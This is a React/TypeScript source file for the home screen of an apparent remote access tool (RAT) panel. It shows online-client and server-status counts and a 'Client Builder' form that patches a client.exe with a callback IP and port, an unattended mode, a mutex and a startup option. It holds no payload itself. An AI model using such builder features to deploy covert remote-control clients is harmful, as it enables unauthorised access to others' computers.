import { useContext, useState, useEffect } from "react";
import { RATContext } from "../rat/RATContext";
import { buildClientCmd } from "../rat/RATCommands";

export const Home: React.FC = () => {
  const { running, clientList } = useContext(RATContext)!;
  const [buildIp, setBuildIp] = useState<string>("127.0.0.1");
  const [buildPort, setBuildPort] = useState<string>("1337");
  const [buildUnattended, setBuildUnattended] = useState<boolean>(false);
  const [buildMutexEnabled, setBuildMutexEnabled] = useState<boolean>(false);
  const [buildMutex, setBuildMutex] = useState<string>("");
  const [buildStart, _setBuildStartup] = useState<boolean>(false);

  const randomString = (length: number) => {
    const chars =
      "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let result = "";
    for (let i = length; i > 0; --i)
      result += chars[Math.floor(Math.random() * chars.length)];
    return result;
  };

  useEffect(() => {
    if (buildMutexEnabled && buildMutex === "") {
      setBuildMutex(randomString(24));
    }
  }, [buildMutexEnabled]);

  const buildClient = async () => {
    await buildClientCmd(
      buildIp,
      buildPort,
      buildUnattended,
      buildMutexEnabled,
      buildMutex,
      buildStart
    );
  };

  return (
    <div className="p-8 flex flex-1 flex-col overflow-auto w-full gap-6">
      <div className="stats shadow border border-primary min-h-[100px]">
        <div className="stat">
          <div className="stat-figure">
            <i className="ri-user-fill ri-2x"></i>
          </div>
          <div className="stat-title">Online Clients</div>
          <div className="stat-value">{clientList.length}</div>
        </div>

        <div className="stat">
          <div className="stat-figure ">
            <i className="ri-server-fill ri-2x"></i>
          </div>
          <div className="stat-title ">Server Status</div>
          <div className="stat-value ">{running ? "Online" : "Offline"}</div>
        </div>
      </div>

      <div className="home-content flex self-end">
        <div className="justify-self-end">
          <div className="card bg-base-100 !min-w-[350px] shadow-xl border border-primary">
            <div className="card-body gap-4">
              <h2 className="card-title">Client Builder</h2>
              <span>Patch the client with custom settings.</span>
              <span>
                Make sure you have the client.exe in your server folder.
              </span>

              <div className="form-control">
                <label className="input input-bordered flex items-center gap-2">
                  IP
                  <input
                    type="text"
                    placeholder="127.0.0.1"
                    className="grow"
                    value={buildIp}
                    onChange={(e) => setBuildIp(e.target.value)}
                  />
                </label>
              </div>

              <div className="form-control">
                <label className="input input-bordered flex items-center gap-2">
                  Port
                  <input
                    type="text"
                    placeholder="1337"
                    className="grow"
                    value={buildPort}
                    onChange={(e) => setBuildPort(e.target.value)}
                  />
                </label>
              </div>

              <div className="form-control">
                <label className="cursor-pointer label border-2 border-neutral rounded-lg p-3">
                  <span className="label-text">Unattended Mode</span>
                  <input
                    type="checkbox"
                    checked={buildUnattended}
                    onChange={(e) => setBuildUnattended(e.target.checked)}
                    className="checkbox checkbox-primary"
                  />
                </label>
              </div>

              <div className="form-control">
                <label className="cursor-pointer label border-2 border-neutral rounded-lg p-3">
                  <span className="label-text">Mutex Enabled</span>
                  <input
                    type="checkbox"
                    checked={buildMutexEnabled}
                    onChange={(e) => setBuildMutexEnabled(e.target.checked)}
                    className="checkbox checkbox-primary"
                  />
                </label>
              </div>

              {buildMutexEnabled && (
                <div className="form-control flex flex-row gap-2">
                  <label className="input input-bordered flex items-center grow gap-2">
                    Mutex
                    <input
                      type="text"
                      placeholder="Mutex"
                      className="grow"
                      value={buildMutex}
                      onChange={(e) => setBuildMutex(e.target.value)}
                    />
                  </label>
                  <a
                    className="btn btn-primary"
                    onClick={() => setBuildMutex(randomString(24))}
                  >
                    <i className="ri-refresh-line ri-2x"></i>
                  </a>
                </div>
              )}
              <a onClick={() => buildClient()} className="btn btn-primary">
                Build Client
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
